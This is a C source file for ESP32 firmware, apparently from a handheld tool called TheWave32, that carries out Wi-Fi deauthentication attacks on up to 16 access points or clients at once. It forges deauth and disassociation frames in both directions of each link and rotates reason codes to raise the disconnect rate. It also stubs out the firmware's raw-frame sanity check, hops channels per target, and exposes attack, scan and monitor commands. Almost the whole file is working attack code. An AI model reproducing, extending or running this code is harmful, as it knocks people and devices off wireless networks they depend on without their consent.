/*
 * TheWave32 / wifi-deauth (v0.4.0 — multi-target)
 *
 * Up to 16 simultaneous targets. The deauth worker rotates through
 * `s_state.targets[]`, hops the radio to each target's channel before
 * its 100 ms burst, and resumes. The legacy single-target API
 * (`attack <ssid|N>`, `start <BSSID|N>`) still works — it just clears
 * the target list and adds the resolved one as targets[0].
 *
 * New commands:
 *   add <BSSID|N> [STA] [channel]   — append a target
 *   add_ssid <SSID>                 — scan + append matching AP
 *   targets                         — dump the current target list
 *   clear                           — purge all targets (and stop)
 */

#include <stdatomic.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_err.h"

#include "tw32_cdc_cli.h"
#include "tw32_io.h"
#include "tw32_json_out.h"
#include "tw32_led.h"
#include "tw32_nvs_kv.h"
#include "tw32_wifi_scan.h"

#define MODULE_NAME            "wifi-deauth"
#define MODULE_VERSION         "0.4.1"
#define DEFAULT_CHANNEL        6
#define MAX_TARGETS            16
#define DEAUTH_REASON_DEFAULT  7

/* 802.11 management frame-control values for deauth and disassoc. */
#define FC_DEAUTH              0x00C0
#define FC_DISASSOC            0x00A0

typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  addr1[6];
    uint8_t  addr2[6];
    uint8_t  addr3[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
} __attribute__((packed)) ieee80211_deauth_t;

typedef struct {
    uint8_t  bssid[6];
    uint8_t  sta[6];
    uint8_t  channel;
    char     ssid_label[33];
} target_t;

typedef struct {
    bool        active;
    target_t    targets[MAX_TARGETS];
    int         target_count;
    uint32_t    packets_sent;
    uint16_t    seq_num;
    uint16_t    reason;
} deauth_state_t;

/* Legacy alias — wifi-deauth used `ap_entry_t` before scan moved to tw32_common. */
typedef tw32_ap_entry_t ap_entry_t;

static deauth_state_t s_state = {
    .active = false,
    .target_count = 0,
    .packets_sent = 0,
    .seq_num = 0,
    .reason = DEAUTH_REASON_DEFAULT,
};

static SemaphoreHandle_t s_state_mtx = NULL;

/* Promiscuous-mode RX counters for the `monitor` command. Written in the
 * Wi-Fi RX callback, read by the CLI on another core: atomic so the
 * cross-core RMW/read is defined rather than a data race. */
static _Atomic uint32_t s_rx_total;
static _Atomic uint32_t s_rx_beacons_target;
static _Atomic uint32_t s_rx_data_target;
static _Atomic uint32_t s_rx_data_any;

/* `s_monitor_bssid` is 6 bytes (not a natural atomic width). The CLI sets
 * it from `cmd_monitor`; the IRAM promisc callback reads it on the Wi-Fi
 * core. A plain memcpy/memcmp would be a torn read across cores. Use a
 * seqlock-style generation counter: writer bumps to odd, copies, bumps to
 * even; reader retries if the generation is odd or changed mid-read.
 * Reference: classic Linux seqlock pattern, safe for single-writer /
 * many-reader with no reader blocking. */
static uint8_t           s_monitor_bssid[6] = {0};
static _Atomic uint32_t  s_monitor_gen      = 0;

/* Writer: CLI thread only. */
static inline void monitor_bssid_set(const uint8_t *mac) {
    uint32_t g = atomic_load_explicit(&s_monitor_gen, memory_order_relaxed);
    atomic_store_explicit(&s_monitor_gen, g + 1, memory_order_release);
    memcpy(s_monitor_bssid, mac, 6);
    atomic_store_explicit(&s_monitor_gen, g + 2, memory_order_release);
}

/* Reader: returns true if a stable copy was obtained in `out`. May
 * spuriously return false during an in-flight write; caller can simply
 * skip the comparison for this packet. */
static inline bool monitor_bssid_snapshot(uint8_t out[6]) {
    uint32_t g1 = atomic_load_explicit(&s_monitor_gen, memory_order_acquire);
    if (g1 & 1u) return false;
    memcpy(out, s_monitor_bssid, 6);
    uint32_t g2 = atomic_load_explicit(&s_monitor_gen, memory_order_acquire);
    return g1 == g2;
}

int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    (void)arg; (void)arg2; (void)arg3;
    return 0;
}

#define STATE_LOCK()    xSemaphoreTake(s_state_mtx, portMAX_DELAY)
#define STATE_UNLOCK()  xSemaphoreGive(s_state_mtx)

static bool mac_str_to_bytes(const char *str, uint8_t *mac) {
    int vals[6];
    if (sscanf(str, "%x:%x:%x:%x:%x:%x",
               &vals[0], &vals[1], &vals[2],
               &vals[3], &vals[4], &vals[5]) != 6) {
        return false;
    }
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)vals[i];
    return true;
}

static void mac_bytes_to_str(const uint8_t *mac, char *out, size_t out_len) {
    snprintf(out, out_len, "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static void wifi_init_sta(void) {
    esp_err_t e = esp_event_loop_create_default();
    if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) {
        ESP_ERROR_CHECK(e);
    }
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    esp_wifi_set_ps(WIFI_PS_NONE);
}

static esp_err_t attack_radio_start(uint8_t channel) {
    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) return err;
    return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

static void attack_radio_stop(void) {
    esp_wifi_set_promiscuous(false);
}

static IRAM_ATTR void promisc_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    (void)type;
    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
    if (p->rx_ctrl.sig_len < 24) return;
    s_rx_total++;
    uint8_t fc0 = p->payload[0];

    /* Snapshot the monitor BSSID with a seqlock; if it is being updated
     * or all-zero (no monitor active) skip the target classification but
     * still bump the totals so `total_rx` is accurate. */
    uint8_t mon[6];
    bool mon_ok = monitor_bssid_snapshot(mon);
    static const uint8_t zero6[6] = {0};
    bool mon_set = mon_ok && memcmp(mon, zero6, 6) != 0;

    if (fc0 == 0x80) {
        if (mon_set && memcmp(&p->payload[16], mon, 6) == 0) {
            s_rx_beacons_target++;
        }
        return;
    }
    if ((fc0 & 0x0c) == 0x08) {
        s_rx_data_any++;
        if (mon_set &&
            (memcmp(&p->payload[4],  mon, 6) == 0 ||
             memcmp(&p->payload[10], mon, 6) == 0 ||
             memcmp(&p->payload[16], mon, 6) == 0)) {
            s_rx_data_target++;
        }
    }
}

/* Reason codes rotated through each burst. Some client drivers ignore
 * a specific code, so cycling them lifts the success rate. */
static const uint16_t REASONS[3] = { 7, 1, 3 };

/* Send one deauth/disassoc management frame. `ra` is the receiver
 * address, `ta` the transmitter; for AP->STA pass (sta, bssid), for
 * STA->AP pass (bssid, sta). */
static void send_mgmt_frame(uint16_t fc,
                            const uint8_t *ra, const uint8_t *ta,
                            const uint8_t *bssid,
                            uint16_t reason, uint16_t seq) {
    ieee80211_deauth_t f = {0};
    f.frame_control = fc;
    f.duration      = 0x013A;
    memcpy(f.addr1, ra,    6);
    memcpy(f.addr2, ta,    6);
    memcpy(f.addr3, bssid, 6);
    f.seq_ctrl    = (uint16_t)((seq & 0x0FFF) << 4);
    f.reason_code = reason;
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t *)&f,
                                      sizeof(f), false);
    if (err == ESP_OK) {
        STATE_LOCK();
        s_state.packets_sent++;
        STATE_UNLOCK();
    } else {
        tw32_json_begin();
        tw32_json_kv_str("event", "tx_failed");
        tw32_json_kv_int("err", err);
        tw32_json_end();
    }
}

/* Multi-target worker: rotates through targets, hops channel per burst. */
static void deauth_worker(void *arg) {
    (void)arg;
    int idx = 0;
    while (1) {
        bool     active;
        target_t target;
        uint16_t seq_base;
        int      n;

        STATE_LOCK();
        active = s_state.active;
        n = s_state.target_count;
        if (active && n > 0) {
            if (idx >= n) idx = 0;
            target = s_state.targets[idx];
            seq_base = s_state.seq_num;
            s_state.seq_num = (uint16_t)((s_state.seq_num + 10) & 0x0FFF);
            idx = (idx + 1) % n;
        }
        STATE_UNLOCK();

        if (active && n > 0) {
            esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
            for (int i = 0; i < 10; i++) {
                /* Alternate deauth/disassoc, rotate the reason code,
                 * and hit both directions of the link. */
                uint16_t fc = (i & 1) ? FC_DISASSOC : FC_DEAUTH;
                uint16_t rs = REASONS[i % 3];
                uint16_t sq = (uint16_t)((seq_base + i) & 0x0FFF);
                send_mgmt_frame(fc, target.sta, target.bssid,
                                target.bssid, rs, sq);
                vTaskDelay(pdMS_TO_TICKS(5));
                send_mgmt_frame(fc, target.bssid, target.sta,
                                target.bssid, rs, sq);
                vTaskDelay(pdMS_TO_TICKS(5));
            }
            /* Sleep tighter when many targets (more bursts/sec total). */
            if (n >= 4) vTaskDelay(pdMS_TO_TICKS(20));
            else        vTaskDelay(pdMS_TO_TICKS(100 / (n > 0 ? n : 1)));
        } else {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    }
}

/* --- Helpers ---------------------------------------------------------- */

/* Append target. Caller must hold STATE_LOCK. Returns 0 on success, -1 if
 * the list is full. Does NOT dedupe — caller decides. */
static int target_append_locked(const uint8_t *bssid, const uint8_t *sta,
                                uint8_t channel, const char *ssid_label)
{
    if (s_state.target_count >= MAX_TARGETS) return -1;
    target_t *t = &s_state.targets[s_state.target_count++];
    memcpy(t->bssid, bssid, 6);
    memcpy(t->sta,   sta,   6);
    t->channel = channel;
    if (ssid_label) {
        strncpy(t->ssid_label, ssid_label, sizeof(t->ssid_label) - 1);
        t->ssid_label[sizeof(t->ssid_label) - 1] = '\0';
    } else {
        t->ssid_label[0] = '\0';
    }
    return 0;
}

static bool resolve_index(const char *s, ap_entry_t *out_entry)
{
    return tw32_wifi_scan_resolve_index(s, out_entry);
}

static int wifi_scan_blocking(wifi_ap_record_t *records, size_t max_records)
{
    return tw32_wifi_scan_silent(records, max_records);
}

/* --- scan ------------------------------------------------------------- */

static int cmd_scan(tw32_cli_ctx_t *ctx, int argc, char **argv) {
    (void)ctx; (void)argc; (void)argv;

    STATE_LOCK();
    bool was_active = s_state.active;
    STATE_UNLOCK();
    if (was_active) {
        tw32_cli_ack_err("scan", "attack_active_stop_first");
        return -1;
    }

    if (tw32_wifi_scan_run() < 0) {
        tw32_cli_ack_err("scan", "scan_failed");
        return -1;
    }
    return 0;
}

/* attack <SSID|N> [STA_MAC] — clears targets + adds resolved one (legacy). */
static int cmd_attack(tw32_cli_ctx_t *ctx, int argc, char **argv) {
    (void)ctx;
    if (argc < 2) {
        tw32_cli_ack_err("attack", "usage: attack <SSID|N> [STA_MAC]");
        return -1;
    }

    STATE_LOCK();
    bool was_active = s_state.active;
    s_state.active = false;
    STATE_UNLOCK();
    if (was_active) attack_radio_stop();

    ap_entry_t entry;
    bool from_index = resolve_index(argv[1], &entry);
    char     resolved_ssid[33];
    uint8_t  resolved_bssid[6];
    uint8_t  resolved_channel;

    if (from_index) {
        memcpy(resolved_bssid, entry.bssid, 6);
        resolved_channel = entry.channel;
        strncpy(resolved_ssid, entry.ssid, sizeof(resolved_ssid) - 1);
        resolved_ssid[sizeof(resolved_ssid) - 1] = '\0';
    } else {
        wifi_ap_record_t *records = malloc(sizeof(wifi_ap_record_t) * TW32_WIFI_SCAN_MAX);
        if (!records) { tw32_cli_ack_err("attack", "out of memory"); return -1; }
        int count = wifi_scan_blocking(records, TW32_WIFI_SCAN_MAX);
        if (count <= 0) {
            tw32_cli_ack_err("attack", "no networks found");
            free(records); return -1;
        }
        wifi_ap_record_t *found = NULL;
        for (int i = 0; i < count; i++) {
            if (strcasecmp((char*)records[i].ssid, argv[1]) == 0) { found = &records[i]; break; }
        }
        if (!found) {
            tw32_cli_ack_err("attack", "SSID not found (try `scan` first then `attack <N>`)");
            free(records); return -1;
        }
        memcpy(resolved_bssid, found->bssid, 6);
        resolved_channel = found->primary;
        strncpy(resolved_ssid, (char*)found->ssid, sizeof(resolved_ssid) - 1);
        resolved_ssid[sizeof(resolved_ssid) - 1] = '\0';
        free(records);
    }

    uint8_t sta_mac[6];
    if (argc >= 3) {
        if (!mac_str_to_bytes(argv[2], sta_mac)) {
            tw32_cli_ack_err("attack", "invalid STA MAC"); return -1;
        }
    } else {
        memset(sta_mac, 0xFF, 6);
    }

    if (attack_radio_start(resolved_channel) != ESP_OK) {
        tw32_cli_ack_err("attack", "set_channel failed"); return -1;
    }

    /* Legacy semantics: replace target list with this one. */
    STATE_LOCK();
    s_state.target_count = 0;
    target_append_locked(resolved_bssid, sta_mac, resolved_channel, resolved_ssid);
    s_state.packets_sent  = 0;
    s_state.seq_num       = 0;
    s_state.reason        = DEAUTH_REASON_DEFAULT;
    s_state.active        = true;
    STATE_UNLOCK();
    /* cmd_attack writes its own JSON instead of using
     * tw32_cli_ack_ok, so the LED auto-toggle never fires — drive it
     * here so the user sees the fast-cycle while the worker runs. */
    tw32_led_set_running(true);

    char bssid_str[18], sta_str[18];
    mac_bytes_to_str(resolved_bssid, bssid_str, sizeof(bssid_str));
    mac_bytes_to_str(sta_mac,        sta_str,   sizeof(sta_str));
    tw32_json_begin();
    tw32_json_kv_str("cmd", "attack");
    tw32_json_kv_bool("ok", true);
    tw32_json_kv_str("ssid", resolved_ssid);
    tw32_json_kv_str("bssid", bssid_str);
    tw32_json_kv_str("target", sta_str);
    tw32_json_kv_int("channel", resolved_channel);
    tw32_json_end();
    return 0;
}

/* start <BSSID|N> [STA_MAC] [channel]  — legacy single-target launch. */
static int cmd_start(tw32_cli_ctx_t *c, int argc, char **argv) {
    (void)c;
    if (argc < 2 || argc > 4) {
        tw32_cli_ack_err("start", "usage: start <BSSID|N> [STA_MAC] [channel]");
        return -1;
    }
    uint8_t bssid[6], sta[6];
    int channel = DEFAULT_CHANNEL;
    char ssid_label[33] = "";

    ap_entry_t entry;
    bool from_index = resolve_index(argv[1], &entry);
    if (from_index) {
        memcpy(bssid, entry.bssid, 6);
        channel = entry.channel;
        strncpy(ssid_label, entry.ssid, sizeof(ssid_label) - 1);
    } else if (!mac_str_to_bytes(argv[1], bssid)) {
        tw32_cli_ack_err("start", "invalid BSSID/index (run `scan` first for indices)");
        return -1;
    }

    if (argc >= 3) {
        if (!mac_str_to_bytes(argv[2], sta)) {
            tw32_cli_ack_err("start", "invalid STA MAC");
            return -1;
        }
    } else {
        memset(sta, 0xFF, 6);
    }
    if (argc == 4) {
        channel = atoi(argv[3]);
        if (channel < 1 || channel > 14) {
            tw32_cli_ack_err("start", "channel 1-14");
            return -1;
        }
    }

    STATE_LOCK();
    bool was_active = s_state.active;
    s_state.active = false;
    STATE_UNLOCK();
    if (was_active) attack_radio_stop();

    if (attack_radio_start((uint8_t)channel) != ESP_OK) {
        tw32_cli_ack_err("start", "set_channel failed");
        return -1;
    }

    STATE_LOCK();
    s_state.target_count = 0;
    target_append_locked(bssid, sta, (uint8_t)channel, ssid_label);
    s_state.packets_sent  = 0;
    s_state.seq_num       = 0;
    s_state.reason        = DEAUTH_REASON_DEFAULT;
    s_state.active        = true;
    STATE_UNLOCK();
    tw32_led_set_running(true);

    char bssid_str[18], sta_str[18];
    mac_bytes_to_str(bssid, bssid_str, sizeof(bssid_str));
    mac_bytes_to_str(sta,   sta_str,   sizeof(sta_str));
    tw32_json_begin();
    tw32_json_kv_str("cmd", "start");
    tw32_json_kv_bool("ok", true);
    if (ssid_label[0]) tw32_json_kv_str("ssid", ssid_label);
    tw32_json_kv_str("bssid", bssid_str);
    tw32_json_kv_str("target", sta_str);
    tw32_json_kv_int("channel", channel);
    tw32_json_end();
    return 0;
}

/* add <BSSID|N> [STA_MAC] [channel]  — append to target list, no implicit start. */
static int cmd_add(tw32_cli_ctx_t *c, int argc, char **argv) {
    (void)c;
    if (argc < 2 || argc > 4) {
        tw32_cli_ack_err("add", "usage: add <BSSID|N> [STA] [channel]");
        return -1;
    }
    uint8_t bssid[6], sta[6];
    int channel = DEFAULT_CHANNEL;
    char ssid_label[33] = "";

    ap_entry_t entry;
    bool from_index = resolve_index(argv[1], &entry);
    if (from_index) {
        memcpy(bssid, entry.bssid, 6);
        channel = entry.channel;
        strncpy(ssid_label, entry.ssid, sizeof(ssid_label) - 1);
    } else if (!mac_str_to_bytes(argv[1], bssid)) {
        tw32_cli_ack_err("add", "invalid BSSID/index");
        return -1;
    }
    if (argc >= 3) {
        if (!mac_str_to_bytes(argv[2], sta)) {
            tw32_cli_ack_err("add", "invalid STA MAC");
            return -1;
        }
    } else {
        memset(sta, 0xFF, 6);
    }
    if (argc == 4) {
        channel = atoi(argv[3]);
        if (channel < 1 || channel > 14) {
            tw32_cli_ack_err("add", "channel 1-14");
            return -1;
        }
    }

    int rc;
    STATE_LOCK();
    rc = target_append_locked(bssid, sta, (uint8_t)channel, ssid_label);
    int now = s_state.target_count;
    STATE_UNLOCK();
    if (rc != 0) { tw32_cli_ack_err("add", "list_full"); return -1; }

    tw32_json_begin();
    tw32_json_kv_str("cmd", "add");
    tw32_json_kv_bool("ok", true);
    tw32_json_kv_int("target_count", now);
    tw32_json_end();
    return 0;
}

/* add_ssid <SSID>  — scan and append the matching AP. */
static int cmd_add_ssid(tw32_cli_ctx_t *c, int argc, char **argv) {
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("add_ssid", "missing_arg"); return -1; }

    /* Reject while an attack is running: the worker is calling
     * esp_wifi_set_channel + esp_wifi_80211_tx in tight bursts on the
     * other core; running a 14-channel scan concurrently makes both
     * fight for the radio. Mirror the policy in cmd_scan rather than
     * silently mis-behaving. The user can `stop` then `add_ssid` then
     * resume with `start` / `add` + `attack`. */
    STATE_LOCK();
    bool was_active = s_state.active;
    STATE_UNLOCK();
    if (was_active) {
        tw32_cli_ack_err("add_ssid", "attack_active_stop_first");
        return -1;
    }

    wifi_ap_record_t *records = malloc(sizeof(wifi_ap_record_t) * TW32_WIFI_SCAN_MAX);
    if (!records) { tw32_cli_ack_err("add_ssid", "out of memory"); return -1; }
    int count = wifi_scan_blocking(records, TW32_WIFI_SCAN_MAX);
    if (count <= 0) {
        tw32_cli_ack_err("add_ssid", "no networks found");
        free(records); return -1;
    }
    wifi_ap_record_t *found = NULL;
    for (int i = 0; i < count; i++) {
        if (strcasecmp((char*)records[i].ssid, argv[1]) == 0) { found = &records[i]; break; }
    }
    if (!found) {
        tw32_cli_ack_err("add_ssid", "ssid_not_found");
        free(records); return -1;
    }
    uint8_t sta[6]; memset(sta, 0xFF, 6);
    int rc;
    STATE_LOCK();
    rc = target_append_locked(found->bssid, sta, found->primary, (char*)found->ssid);
    int now = s_state.target_count;
    STATE_UNLOCK();
    free(records);
    if (rc != 0) { tw32_cli_ack_err("add_ssid", "list_full"); return -1; }
    tw32_json_begin();
    tw32_json_kv_str("cmd", "add_ssid");
    tw32_json_kv_bool("ok", true);
    tw32_json_kv_int("target_count", now);
    tw32_json_end();
    return 0;
}

static int cmd_targets(tw32_cli_ctx_t *c, int argc, char **argv) {
    (void)c; (void)argc; (void)argv;
    static target_t snap[MAX_TARGETS];
    int n;
    STATE_LOCK();
    n = s_state.target_count;
    memcpy(snap, s_state.targets, sizeof(snap));
    STATE_UNLOCK();
    for (int i = 0; i < n; i++) {
        char bssid_str[18], sta_str[18];
        mac_bytes_to_str(snap[i].bssid, bssid_str, sizeof(bssid_str));
        mac_bytes_to_str(snap[i].sta,   sta_str,   sizeof(sta_str));
        tw32_json_begin();
        tw32_json_kv_str("event", "target");
        tw32_json_kv_int("idx", i);
        if (snap[i].ssid_label[0]) tw32_json_kv_str("ssid", snap[i].ssid_label);
        tw32_json_kv_str("bssid", bssid_str);
        tw32_json_kv_str("target", sta_str);
        tw32_json_kv_int("channel", snap[i].channel);
        tw32_json_end();
    }
    tw32_json_begin();
    tw32_json_kv_str("cmd", "targets");
    tw32_json_kv_bool("ok", true);
    tw32_json_kv_int("count", n);
    tw32_json_end();
    return 0;
}

static int cmd_clear(tw32_cli_ctx_t *c, int argc, char **argv) {
    (void)c; (void)argc; (void)argv;
    STATE_LOCK();
    bool was_active = s_state.active;
    s_state.active = false;
    s_state.target_count = 0;
    STATE_UNLOCK();
    if (was_active) attack_radio_stop();
    tw32_led_set_running(false);
    tw32_cli_ack_ok("clear");
    return 0;
}

static int cmd_stop(tw32_cli_ctx_t *c, int argc, char **argv) {
    (void)c; (void)argc; (void)argv;
    STATE_LOCK();
    bool was_active = s_state.active;
    uint32_t sent   = s_state.packets_sent;
    s_state.active  = false;
    STATE_UNLOCK();
    if (was_active) attack_radio_stop();
    tw32_led_set_running(false);
    tw32_json_begin();
    tw32_json_kv_str("cmd", "stop");
    tw32_json_kv_bool("ok", true);
    tw32_json_kv_uint("packets_sent", sent);
    tw32_json_end();
    return 0;
}

static int cmd_stats(tw32_cli_ctx_t *c, int argc, char **argv) {
    (void)c; (void)argc; (void)argv;
    deauth_state_t snap;
    STATE_LOCK();
    snap = s_state;
    STATE_UNLOCK();
    char bssid_str[18] = "00:00:00:00:00:00";
    char sta_str[18]   = "ff:ff:ff:ff:ff:ff";
    int  channel       = DEFAULT_CHANNEL;
    if (snap.target_count > 0) {
        mac_bytes_to_str(snap.targets[0].bssid, bssid_str, sizeof(bssid_str));
        mac_bytes_to_str(snap.targets[0].sta,   sta_str,   sizeof(sta_str));
        channel = snap.targets[0].channel;
    }
    tw32_json_begin();
    tw32_json_kv_str("cmd", "stats");
    tw32_json_kv_bool("ok", true);
    tw32_json_kv_bool("active", snap.active);
    tw32_json_kv_int("target_count", snap.target_count);
    /* Legacy fields reflect targets[0] for v0.3 compatibility. */
    tw32_json_kv_str("bssid", bssid_str);
    tw32_json_kv_str("target", sta_str);
    tw32_json_kv_int("channel", channel);
    tw32_json_kv_uint("packets_sent", snap.packets_sent);
    tw32_json_end();
    return 0;
}

/* monitor <BSSID|N> <ms> — unchanged from v0.3 */
static int cmd_monitor(tw32_cli_ctx_t *ctx, int argc, char **argv) {
    (void)ctx;
    if (argc < 3) {
        tw32_cli_ack_err("monitor", "usage: monitor <BSSID|N> <ms>");
        return -1;
    }
    int ms = atoi(argv[2]);
    if (ms < 100 || ms > 60000) {
        tw32_cli_ack_err("monitor", "ms out of range (100..60000)");
        return -1;
    }
    uint8_t bssid[6];
    uint8_t channel = DEFAULT_CHANNEL;
    char    ssid_label[33] = "";
    ap_entry_t entry;
    if (resolve_index(argv[1], &entry)) {
        memcpy(bssid, entry.bssid, 6);
        channel = entry.channel;
        strncpy(ssid_label, entry.ssid, sizeof(ssid_label) - 1);
    } else if (mac_str_to_bytes(argv[1], bssid)) {
        STATE_LOCK();
        if (s_state.target_count > 0) channel = s_state.targets[0].channel;
        STATE_UNLOCK();
    } else {
        tw32_cli_ack_err("monitor", "invalid BSSID/N");
        return -1;
    }
    monitor_bssid_set(bssid);

    STATE_LOCK();
    bool attack_active = s_state.active;
    STATE_UNLOCK();

    bool we_enabled = false;
    if (!attack_active) {
        if (esp_wifi_set_promiscuous(true) == ESP_OK) we_enabled = true;
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }
    uint32_t b0 = s_rx_beacons_target;
    uint32_t d0 = s_rx_data_target;
    uint32_t a0 = s_rx_data_any;
    uint32_t t0 = s_rx_total;
    vTaskDelay(pdMS_TO_TICKS(ms));
    uint32_t b1 = s_rx_beacons_target;
    uint32_t d1 = s_rx_data_target;
    uint32_t a1 = s_rx_data_any;
    uint32_t t1 = s_rx_total;
    if (we_enabled) esp_wifi_set_promiscuous(false);

    /* Clear the monitor BSSID so subsequent attacks do not accumulate
     * target-classified counts from a stale `monitor` invocation. */
    uint8_t zero[6] = {0};
    monitor_bssid_set(zero);

    char bssid_str[18];
    mac_bytes_to_str(bssid, bssid_str, sizeof(bssid_str));
    tw32_json_begin();
    tw32_json_kv_str("cmd", "monitor");
    tw32_json_kv_bool("ok", true);
    if (ssid_label[0]) tw32_json_kv_str("ssid", ssid_label);
    tw32_json_kv_str("bssid", bssid_str);
    tw32_json_kv_int("channel", channel);
    tw32_json_kv_int("ms", ms);
    tw32_json_kv_uint("beacons_target", b1 - b0);
    tw32_json_kv_uint("data_target",    d1 - d0);
    tw32_json_kv_uint("data_any",       a1 - a0);
    tw32_json_kv_uint("total_rx",       t1 - t0);
    tw32_json_kv_bool("attack_active",  attack_active);
    tw32_json_end();
    return 0;
}

static const tw32_cli_cmd_t cli_table[] = {
    { "scan",     "list nearby Wi-Fi networks",                    cmd_scan     },
    { "attack",   "attack <SSID|N> [STA] (replaces target list)",  cmd_attack   },
    { "start",    "start <BSSID|N> [STA] [chan] (legacy single)",  cmd_start    },
    { "add",      "add <BSSID|N> [STA] [chan]",                    cmd_add      },
    { "add_ssid", "add_ssid <SSID> (scan + append)",               cmd_add_ssid },
    { "targets",  "dump current target list",                      cmd_targets  },
    { "clear",    "purge targets and stop",                        cmd_clear    },
    { "stop",     "stop deauth (keep targets)",                    cmd_stop     },
    { "stats",    "show statistics",                               cmd_stats    },
    { "monitor",  "monitor <BSSID|N> <ms> — sample RX traffic",    cmd_monitor  },
};

void app_main(void) {
    tw32_nvs_init();
    tw32_cdc_init();

    s_state_mtx     = xSemaphoreCreateMutex();

    wifi_init_sta();

    esp_wifi_set_promiscuous_rx_cb(promisc_rx_cb);
    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL };
    esp_wifi_set_promiscuous_filter(&filt);

    tw32_wifi_scan_init();
    xTaskCreatePinnedToCore(deauth_worker, "deauth_worker",
                            4096, NULL, 4, NULL, 1);

    tw32_cli_run(MODULE_NAME, MODULE_VERSION,
                 cli_table, sizeof(cli_table)/sizeof(cli_table[0]));
}
